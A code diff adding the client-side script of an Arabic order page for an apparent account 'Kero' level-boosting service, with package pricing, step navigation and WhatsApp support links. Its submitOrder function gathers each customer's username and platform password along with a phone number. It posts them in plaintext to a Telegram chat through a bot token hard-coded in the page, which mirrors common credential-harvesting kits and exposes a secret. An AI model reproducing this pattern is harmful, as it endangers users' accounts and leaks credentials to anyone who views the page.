+                icon.className = 'fas fa-chevron-up';
+            } else {
+                icon.className = 'fas fa-chevron-down';
+            }
+        }
+
+        // دالة لعرض قسم الأسئلة الشائعة
+        function showFaq() {
+            const faqSection = document.getElementById('faqSection');
+            const statsSection = document.getElementById('statsSection');
+            
+            if (faqSection.style.display === 'none') {
+                faqSection.style.display = 'block';
+                statsSection.style.display = 'none';
+                showNotification('تم فتح قسم الأسئلة الشائعة', 'success');
+            } else {
+                faqSection.style.display = 'none';
+            }
+        }
+
+        // دالة لعرض قسم الإحصائيات
+        function showStats() {
+            const statsSection = document.getElementById('statsSection');
+            const faqSection = document.getElementById('faqSection');
+            
+            if (statsSection.style.display === 'none') {
+                statsSection.style.display = 'grid';
+                faqSection.style.display = 'none';
+                showNotification('تم فتح قسم الإحصائيات', 'info');
+            } else {
+                statsSection.style.display = 'none';
+            }
+        }
+
+        // دالة للدعم الفني
+        function contactSupport() {
+            showNotification('جاري فتح الدعم الفني...', 'info');
+            setTimeout(() => {
+                window.open('https://wa.me/201121018575', '_blank');
+            }, 1000);
+        }
+
+        // دالة للدعم الطارئ
+        function showEmergencySupport() {
+            showNotification('جاري فتح الدعم الطارئ...', 'warning');
+            setTimeout(() => {
+                window.open('https://wa.me/201121018575', '_blank');
+            }, 1000);
+        }
+
+        // عداد الكيرو
+        function changeKeroValue(change) {
+            const keroValueElement = document.getElementById('keroValue');
+            let currentValue = parseInt(keroValueElement.textContent);
+            let newValue = currentValue + change;
+            
+            if (newValue < 1) newValue = 1;
+            if (newValue > 20) newValue = 20;
+            
+            keroValueElement.textContent = newValue;
+            
+            // تحديث حقل الإدخال
+            document.getElementById('fromKero').value = 1;
+            document.getElementById('toKero').value = newValue;
+            
+            // إعادة حساب السعر
+            calculatePrice();
+        }
+
+        // تحديث شريط التقدم
+        function updateProgressBar(percent) {
+            document.getElementById('progressBar').style.width = percent + '%';
+        }
+
+        // البيانات
+        const packages = {
+            economy: { 
+                name: 'الباقة الاقتصادية', 
+                price: '١٠', 
+                range: '١-٢ كيرو'
+            },
+            medium: { 
+                name: 'الباقة المتوسطة', 
+                price: '٥٠', 
+                range: '٣-١٠ كيرو'
+            },
+            custom: {
+                name: 'باقة مخصصة',
+                price: '',
+                range: ''
+            }
+        };
+
+        let selectedPackage = '';
+        let customRange = { from: 0, to: 0, price: 0 };
+
+        // تحديث الخطوات
+        function updateSteps(currentStep) {
+            const steps = document.querySelectorAll('.step');
+            steps.forEach((step, index) => {
+                step.classList.remove('active', 'completed');
+                if (index + 1 < currentStep) {
+                    step.classList.add('completed');
+                } else if (index + 1 === currentStep) {
+                    step.classList.add('active');
+                }
+            });
+            
+            // تحديث شريط التقدم
+            updateProgressBar((currentStep / 3) * 100);
+        }
+
+        // اختيار الباقة
+        function selectPackage(packageType) {
+            selectedPackage = packageType;
+            
+            // إزالة التحديد من جميع الباقات
+            document.querySelectorAll('.package').forEach(pkg => {
+                pkg.classList.remove('selected');
+            });
+            
+            // إضافة التحديد للباقة المختارة
+            event.currentTarget.classList.add('selected');
+            
+            // تحديث الخطوات
+            updateSteps(2);
+            
+            // الانتقال للنموذج
+            document.getElementById('packageSection').classList.remove('active');
+            document.getElementById('dataForm').classList.add('active');
+            
+            // إشعار
+            showNotification(`تم اختيار ${packages[packageType].name}`, 'success');
+        }
+        
+        // حساب السعر للنطاق المخصص حسب نظام التسعير الجديد
+        function calculatePrice() {
+            const from = parseInt(document.getElementById('fromKero').value) || 0;
+            const to = parseInt(document.getElementById('toKero').value) || 0;
+            
+            if (from > to) {
+                document.getElementById('calculatedPrice').innerHTML = '<i class="fas fa-calculator"></i> السعر: -- جنيه';
+                document.getElementById('calculatedPrice').classList.remove('active');
+                document.getElementById('priceBreakdown').innerHTML = '';
+                showNotification('⚠️ من فضلك أدخل نطاقًا صحيحًا (من <= إلى)', 'error');
+                return;
+            }
+            
+            if (from === 0 || to === 0) {
+                document.getElementById('calculatedPrice').innerHTML = '<i class="fas fa-calculator"></i> السعر: -- جنيه';
+                document.getElementById('calculatedPrice').classList.remove('active');
+                document.getElementById('priceBreakdown').innerHTML = '';
+                return;
+            }
+            
+            let totalPrice = 0;
+            let breakdown = [];
+            
+            // حساب السعر حسب نظام التسعير الجديد
+            for (let level = from; level <= to; level++) {
+                if (level >= 1 && level <= 17) {
+                    totalPrice += 10;
+                    breakdown.push(`المستوى ${level}: 10 جنيه`);
+                } else if (level === 18 || level === 19 || level === 20) {
+                    totalPrice += 20;
+                    breakdown.push(`المستوى ${level}: 20 جنيه`);
+                }
+            }
+            
+            document.getElementById('calculatedPrice').innerHTML = `<i class="fas fa-calculator"></i> السعر: ${totalPrice} جنيه`;
+            document.getElementById('calculatedPrice').classList.add('active');
+            
+            // عرض تفاصيل التسعير
+            if (breakdown.length > 0) {
+                let breakdownText = breakdown.slice(0, 5).join('<br>');
+                if (breakdown.length > 5) {
+                    breakdownText += `<br>... + ${breakdown.length - 5} مستوى آخر`;
+                }
+                document.getElementById('priceBreakdown').innerHTML = breakdownText;
+            } else {
+                document.getElementById('priceBreakdown').innerHTML = '';
+            }
+            
+            // حفظ البيانات للنطاق المخصص
+            customRange = {
+                from: from,
+                to: to,
+                price: totalPrice
+            };
+        }
+        
+        // اختيار النطاق المخصص
+        function selectCustomRange() {
+            const from = parseInt(document.getElementById('fromKero').value) || 0;
+            const to = parseInt(document.getElementById('toKero').value) || 0;
+            
+            if (from === 0 || to === 0) {
+                showNotification('⚠️ من فضلك أدخل نطاق الكيرو المطلوب', 'error');
+                return;
+            }
+            
+            if (from > to) {
+                showNotification('⚠️ من فضلك أدخل نطاقًا صحيحًا (من <= إلى)', 'error');
+                return;
+            }
+            
+            selectedPackage = 'custom';
+            packages.custom.range = `${from}-${to} كيرو`;
+            packages.custom.price = `${customRange.price} جنيه`;
+            
+            // تحديث الخطوات
+            updateSteps(2);
+            
+            // الانتقال للنموذج
+            document.getElementById('packageSection').classList.remove('active');
+            document.getElementById('dataForm').classList.add('active');
+            
+            showNotification('تم اختيار النطاق المخصص بنجاح', 'success');
+        }
+        
+        // الرجوع لاختيار الباقة
+        function backToPackages() {
+            document.getElementById('dataForm').classList.remove('active');
+            document.getElementById('packageSection').classList.add('active');
+            updateSteps(1);
+        }
+        
+        // إرسال الطلب
+        function submitOrder() {
+            const userName = document.getElementById('userName').value.trim();
+            const password = document.getElementById('platformPassword').value.trim();
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const lastTwoDigits = document.getElementById('lastTwoDigits').value.trim();
+            
+            if (!userName || !password || !phone || !lastTwoDigits) {
+                showNotification('⚠️ من فضلك املأ جميع البيانات المطلوبة', 'error');
+                return;
+            }
+            
+            if (lastTwoDigits.length !== 2 || !/^\d+$/.test(lastTwoDigits)) {
+                showNotification('⚠️ من فضلك أدخل آخر رقمين فقط (رقمين فقط)', 'error');
+                return;
+            }
+            
+            // تحديد بيانات الباقة
+            let packageName, packagePrice, packageRange;
+            
+            if (selectedPackage === 'custom') {
+                packageName = packages.custom.name;
+                packagePrice = packages.custom.price;
+                packageRange = packages.custom.range;
+            } else {
+                packageName = packages[selectedPackage].name;
+                packagePrice = packages[selectedPackage].price;
+                packageRange = packages[selectedPackage].range;
+            }
+            
+            // إرسال البيانات للتليجرام
+            const message = `🛎 طلب جديد من موقع كيرو!\n\n👤 اسم المستخدم: ${userName}\n📱 الهاتف: ${phone}\n🔐 كلمة السر: ${password}\n📦 الباقة: ${packageName}\n📊 النطاق: ${packageRange}\n💵 السعر: ${packagePrice}\n🔢 آخر رقمين: ${lastTwoDigits}\n\n💳 رقم التحويل: 01121018575`;
+            
+            const botToken = '6506189895:AAEwRi0WpBXi3pQ91MAkz8JcsS64v6R5voE';
+            const chatId = '6895524607';
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // تحديث الخطوات
+                    updateSteps(3);
+                    
+                    // الانتقال لصفحة التأكيد
+                    document.getElementById('dataForm').classList.remove('active');
+                    document.getElementById('confirmation').classList.add('active');
+                    
+                    showNotification('تم إرسال طلبك بنجاح!', 'success');
+                } else {
+                    showNotification('حدث خطأ أثناء إرسال الطلب، يرجى المحاولة مرة أخرى', 'error');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                showNotification('حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى', 'error');
+            });
+        }
+        
+        // طلب جديد
+        function newOrder() {
+            // إعادة تعيين النموذج
+            document.getElementById('userName').value = '';
+            document.getElementById('platformPassword').value = '';
+            document.getElementById('phoneNumber').value = '';
+            document.getElementById('lastTwoDigits').value = '';
+            
+            // إزالة التحديد من الباقات
+            document.querySelectorAll('.package').forEach(pkg => {
+                pkg.classList.remove('selected');
+            });
+            
+            // إعادة تعيين النطاق المخصص
+            document.getElementById('fromKero').value = '';
+            document.getElementById('toKero').value = '';
+            document.getElementById('calculatedPrice').innerHTML = '<i class="fas fa-calculator"></i> السعر: -- جنيه';
+            document.getElementById('calculatedPrice').classList.remove('active');
+            document.getElementById('priceBreakdown').innerHTML = '';
+            document.getElementById('keroValue').textContent = '1';
+            
+            // الانتقال للخطوة الأولى
+            document.getElementById('confirmation').classList.remove('active');
+            document.getElementById('packageSection').classList.add('active');
+            updateSteps(1);
+            
+            showNotification('تم بدء طلب جديد', 'info');
+        }
+    </script>
+</body>
+</html>
